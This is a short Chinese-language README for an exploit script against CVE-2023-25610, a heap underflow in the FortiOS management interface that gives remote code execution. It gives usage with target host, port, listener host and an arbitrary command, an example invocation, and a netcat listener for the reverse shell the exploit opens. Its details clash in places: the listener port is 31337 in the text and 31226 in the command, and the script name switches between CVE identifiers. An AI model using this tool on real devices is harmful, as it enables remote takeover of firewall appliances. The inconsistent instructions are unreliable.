# CVE-2023-25610

FortiOS 管理界面中的堆内存下溢导致远程代码执行。

# 范围和限制

1. Fortinet 6.x
2. 基于 TLSv1.3，在其他 TLS 版本上可能存在差异

# 用法

python3 cve-2022-42475.py rhost rport lhost 'command'

```
python3 CVE-2023-25610.py 192.168.10.1 8443 10.10.1.1 'ls -la /'
```

# Listener

EXP 使用 python 命令在端口 31337 上设置反弹 shell

```
nc -lvnp 31226
```